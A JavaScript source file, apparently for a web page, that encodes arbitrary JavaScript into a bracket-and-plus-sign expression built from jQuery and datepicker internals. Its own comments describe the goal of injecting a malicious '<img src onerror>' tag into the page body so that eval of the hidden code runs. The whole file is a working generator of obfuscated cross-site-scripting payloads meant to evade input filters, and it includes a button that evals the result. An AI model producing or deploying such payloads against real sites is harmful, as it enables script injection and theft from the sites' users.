(function (){

  const MAP = {
    0: `+[]`,
    1: `++[[]][+[]]`,
    2: `++[++[[]][+[]]][+[]]`,
    3: `++[++[++[[]][+[]]][+[]]][+[]]`,
    4: `++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]`,
    5: `++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]`,
    6: `++[++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]`,
    7: `++[++[++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]`,
    8: `++[++[++[++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]`,
    9: `++[++[++[++[++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]][+[]]`
  };

  // [][0] === undefined
  Object.assign(MAP, {
    f: `[[]+[][+[]]][+[]][++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]]`,
    i: `[[]+[][+[]]][+[]][++[++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]][+[]]]`,
    n: `[[]+[][+[]]][+[]][++[[]][+[]]]`,
    d: `[[]+[][+[]]][+[]][++[++[[]][+[]]][+[]]]`
  });

  function mapInt(int) {
    if (int < 10) {
      return MAP[int];
    }

    const digits = int.toString().split('');
    return '+[' + digits.map(d => `[${MAP[d]}]`).join('+') + ']';
  }

  function mapStr(str) {
    let chars = str.split('');
    for (let char of chars) {
      if (!(char in MAP)) {
        const index = $$$.indexOf(char);
        if (index >= 0) {
          MAP[char] = `$$$[${mapInt(index)}]`
        } else {
          throw new Error(`char ${char} is not available in ${str}`);
        }

      }
    }
    return chars.map(c => MAP[c]).join('+');
  }

  const $$ = ",";

  // $.find = "Sizzle( selector, context, ..."
  MAP["$.find"] = `[$[${mapStr("find")}]+[]][+[]]`;
  const $$$ = eval(MAP["$.find"]);

  // "".constructor.name == "String"
  MAP["String"] = `$$[${mapStr("constructor")}][${mapStr("name")}]`;
  MAP["outerHTML"] = mapStr("outerHTML");

  const $$$$$ = eval(MAP["outerHTML"]);

  // $.datepicker.dpDiv[0]
  MAP["$.datepicker.dpDiv[0]"] = `
    [
      $
        [${mapStr("datepicker")}]
        [${mapStr("dpDiv")}]
    ]
    [+[]]
    [+[]]`;

  const $$$$ = eval(MAP["$.datepicker.dpDiv[0]"]);

  Object.assign(MAP, {
    '<': `$$$$[$$$$$][${mapInt(0)}]`,
    '>': `$$$$[$$$$$][${mapInt(110)}]`,
    '=': `$$$$[$$$$$][${mapInt(7)}]`,
    '"': `$$$$[$$$$$][${mapInt(8)}]`
  });

  function encode(input) {

    // idea: inject a malicious img tag that runs the "onerror" code
    // body.innerHTML += " <img src onerror='eval(`code`)'>"

    // first, we need to get the body.innerHTML
    // $.datepicker.dpDiv[0].ownerDocument.body.innerHTML
    const bodyHTML = `[
      $$$$
        [${mapStr('ownerDocument')}]
        [${mapStr('body')}]
        [${mapStr('innerHTML')}
      ]`;

    // get comma to separate character codes
    // "[0,0]"[2]
    const comma = `[
        $$=[+[]]
      ]+[
        $$[++[[]][+[]]]=+[]
      ]+[
        $$=[$$+[]][+[]][++[[]][+[]]]
      ]`;

    // create character code sequence
    const charCodes = [];
    for (let c = 0; c < input.length; c++) {
      const code = `${mapInt(input.charCodeAt(c))}`;
      charCodes.push(`[${code}][+[]]`);
    }
    const characters = `[${charCodes.join(`+$$+`)}][+[]]`;

    // convert chars back using
    // String.fromCharCode(1,2,3,4,5);
    const code = `${mapStr("eval(")} +
      ${MAP["String"]} +
      ${mapStr(".fromCharCode(")} +
      ${characters} +
      ${mapStr(`))`)}`;

    const img = `${mapStr('<img src onerror="')} + ${code} + ${mapStr('">')}`;

    return `
      ${comma} +
      [$$$ = ${MAP["$.find"]}] +
      [$$$$ = ${MAP["$.datepicker.dpDiv[0]"]}] +
      [$$$$$ = ${MAP["outerHTML"]}] +

      ${bodyHTML} += ${img}]`
      .replace(/\s/g, "");
  }

  function convert(){
    const value = encode($("#input").val());
    $("#output").val(value);
    $("#count").text(`${value.length} chars`);
  }

  function init(){

    $("img[src]").remove();

    $("#convert").on("click", function(){
      $("#output").val("...");
      $("#count").text("...");
      setTimeout(convert, 200);
      return false;
    });

    $("#run").on("click", function(){
      const value = $("#input").val();
      eval.call(window,($("#output").val()));
      $("#input").val(value);
      init();
      return false;
    });

    convert();
  }

  init();

})();